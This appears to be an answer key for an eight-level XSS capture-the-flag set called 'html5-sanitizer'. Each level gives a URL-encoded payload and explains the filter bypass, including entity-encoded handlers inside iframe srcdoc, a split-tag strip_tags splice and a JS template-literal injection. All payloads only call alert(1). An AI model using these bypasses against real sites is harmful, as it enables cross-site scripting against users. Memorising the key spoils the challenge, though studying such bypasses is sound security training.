# html5-sanitizer — solutions

Historic CVE-style sanitizer bypasses. The reliable modern vector across these
levels is `<iframe srcdoc="…">`: the outer parser entity-decodes the `srcdoc`
attribute *value*, so an event handler hidden as `on&#101;rror` survives a
handler-stripping filter and only becomes `onerror` when the iframe re-parses
its document. Levels without an iframe/handler filter take a plain event tag.

### html5-sanitizer-level1

`/html5-sanitizer/level1/?query=%3Ciframe%20srcdoc=%22%3Cimg%20src=x%20on%26%23101%3Brror=alert(1)%3E%22%3E`

- payload: `<iframe srcdoc="<img src=x on&#101;rror=alert(1)>">`
- context: strips `<script>`, plain `<iframe>`, `<object>` and `on\w+=`; an iframe carrying `srcdoc` dodges the srcdoc-negative-lookahead iframe rule, and `on&#101;rror` slips the handler strip then decodes on re-parse

### html5-sanitizer-level2

`/html5-sanitizer/level2/?query=%3Ciframe%20srcdoc=%22%3Cimg%20src=x%20on%26%23101%3Brror=alert(1)%3E%22%3E`

- payload: `<iframe srcdoc="<img src=x on&#101;rror=alert(1)>">`
- context: strips `script`/`javascript:`/`on\w+=` but never touches `<iframe>`; the entity-encoded handler inside `srcdoc` survives and decodes when the frame parses

### html5-sanitizer-level3

`/html5-sanitizer/level3/?query=%3Cifra%3Ciframe%3Eme%20srcdoc=%22%3Cimg%20src=x%20on%26%23101%3Brror=alert(1)%3E%22%3E`

- payload: `<ifra<iframe>me srcdoc="<img src=x on&#101;rror=alert(1)>">`
- context: single-pass `strip_tags` removes the inner `<iframe>`, whose deletion splices the halves into a real `<iframe srcdoc>`; `on&#101;rror` survives the handler strip and decodes on re-parse

### html5-sanitizer-level4

`/html5-sanitizer/level4/?query=%24%7Balert(1)%7D`

- payload: `${alert(1)}`
- context: the sanitized value is interpolated into a JS template literal (backtick string) before it ever reaches innerHTML — a `${…}` substitution executes when the literal is evaluated, needing no tag or handler

### html5-sanitizer-level5

`/html5-sanitizer/level5/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: only `script` and `javascript:` are stripped — no handler filter — so a plain `onerror` tag reflects into the body intact

### html5-sanitizer-level6

`/html5-sanitizer/level6/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: strips `<script>`/`<object>` and `javascript:` but leaves `<img>` and its `onerror` handler untouched

### html5-sanitizer-level7

`/html5-sanitizer/level7/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: strips only `data:` and `script`; a non-`script` event-handler tag reflects raw into the body

### html5-sanitizer-level8

`/html5-sanitizer/level8/?query=%3Ciframe%20srcdoc=%22%3Cimg%20src=x%20on%26%23101%3Brror=alert(1)%3E%22%3E`

- payload: `<iframe srcdoc="<img src=x on&#101;rror=alert(1)>">`
- context: strips `<script>` and `on\w+=` but keeps `<iframe>`; the entity-encoded handler in `srcdoc` survives and decodes when the frame parses
